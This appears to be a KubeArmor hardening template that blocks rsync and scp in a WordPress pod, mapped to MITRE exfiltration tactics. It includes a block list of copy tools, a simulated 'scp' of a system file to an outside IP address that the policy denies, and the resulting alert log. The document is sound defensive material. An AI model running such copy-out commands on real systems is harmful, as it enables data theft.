# File Copy
Prevent file copy using standard utilities.

## Description
Exfiltration consists of techniques that adversaries may use to steal data from your network. Once they’ve collected data, adversaries often package it to avoid detection while removing it. This can include compression and encryption. Techniques for getting data out of a target network typically include transferring it over their command and control channel or an alternate channel and may also include putting size limits on the transmission.

## Attack Scenario
It's important to note that file copy tools can be leveraged by attackers for exfiltrating sensitive data and transferring malicious payloads into the workloads. Additionally, it can also assist in lateral movement within the system. It's crucial to take proactive measures to prevent these attacks from occurring. [**Examples:** Credential Access, Lateral movements, Information Disclosure, etc.]

## Tags
- MITRE_TA0010_exfiltration
- NIST_800-53_SI-4(18)
- MITRE_TA0008_lateral_movement

## Policy Templates
### File Copy
```yaml
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: harden-wordpress-remote-file-copy
  namespace: wordpress-mysql
spec:
  action: Block
  message: Alert! remote file copy tools execution prevented.
  process:
    matchPaths:
    - path: /usr/bin/rsync
    - path: /bin/rsync
    - path: /usr/bin/scp
    - path: /bin/scp
    - path: /usr/bin/scp
    - path: /bin/scp
  selector:
    matchLabels:
      app: wordpress
  severity: 5
  tags:
  - MITRE
  - MITRE_TA0008_lateral_movement
  - MITRE_TA0010_exfiltration
  - MITRE_TA0006_credential_access
  - MITRE_T1552_unsecured_credentials
  - NIST_800-53_SI-4(18)
  - NIST
  - NIST_800-53
  - NIST_800-53_SC-4
```
#### Simulation
```sh
root@wordpress-fb448db97-wj7n7:/usr/bin# scp /etc/ca-certificates.conf 104.192.3.74:/mine/                              
bash: /usr/bin/scp: Permission denied                                                                                   
root@wordpress-fb448db97-wj7n7:/usr/bin#     
```

#### Expected Alert
```
root:{} 35 items
Action:Block
ClusterName:d3mo
ContainerID:548176888fca6bb6d66633794f3d5f9d54930a9d9f43d4f05c11de821c758c0f
ContainerImage:docker.io/library/wordpress:4.8-apache@sha256:6216f64ab88fc51d311e38c7f69ca3f9aaba621492b4f1fa93ddf63093768845
ContainerName:wordpress
Data:syscall=SYS_EXECVE
Enforcer:AppArmor
HostName:master-node
HostPID:72178
HostPPID:30490
Labels:app=wordpress
Message:Alert! remote file copy tools execution prevented.
NamespaceName:wordpress-mysql
Operation:Process
Owner:{} 3 items
Name:wordpress
Namespace:wordpress-mysql
Ref:Deployment
PID:259
PPID:193
ParentProcessName:/bin/bash
PodName:wordpress-fb448db97-wj7n7
PolicyName:harden-wordpress-remote-file-copy
ProcessName:/usr/bin/scp
Resource:/usr/bin/scp /etc/ca-certificates.conf 104.192.3.74:/mine/
Result:Permission denied
Severity:5
Source:/bin/bash
Tags:MITRE,MITRE_TA0008_lateral_movement,MITRE_TA0010_exfiltration,MITRE_TA0006_credential_access,MITRE_T1552_unsecured_credentials,NIST_800-53_SI-4(18),NIST,NIST_800-53,NIST_800-53_SC-4
Timestamp:1696487496
Type:MatchedPolicy
UpdatedTime:2023-10-05T06:31:36.085860Z
cluster_id:2302
component_name:kubearmor
instanceGroup:0
instanceID:0
tenant_id:167
workload:1
```

## References
[MITRE Exfiltration](https://attack.mitre.org/tactics/TA0010/)



